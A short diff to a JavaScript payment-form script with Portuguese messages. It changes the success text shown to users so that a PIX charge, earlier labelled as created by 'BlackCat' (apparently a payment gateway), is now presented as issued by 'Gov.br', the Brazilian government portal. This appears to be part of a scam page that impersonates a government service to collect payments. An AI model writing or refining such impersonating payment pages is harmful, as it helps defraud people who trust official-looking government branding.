@@ -194,7 +194,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             if (response.ok) {
-                console.log('✅ SUCESSO! PIX REAL gerado pela BlackCat!');
+                console.log('✅ SUCESSO! PIX gerado pela Gov.br!');
                 console.log('🎉 Dados da transação:', responseData);
                 
                 // Armazenar dados da transação REAL
@@ -211,8 +211,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 const successDiv = document.createElement('div');
                 successDiv.className = 'bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded relative mb-4';
                 successDiv.innerHTML = `
-                    <strong class="font-bold">🎉 PIX REAL Gerado com Sucesso!</strong>
-                    <span class="block sm:inline">PIX BlackCat criado! Redirecionando para pagamento...</span>
+                    <strong class="font-bold">🎉 PIX Gerado com Sucesso!</strong>
+                    <span class="block sm:inline">PIX Gov.br criado! Redirecionando para pagamento...</span>
                     <div class="text-sm mt-1">ID: ${responseData.id || 'N/A'}</div>
                 `;
                 form.insertBefore(successDiv, form.firstChild);
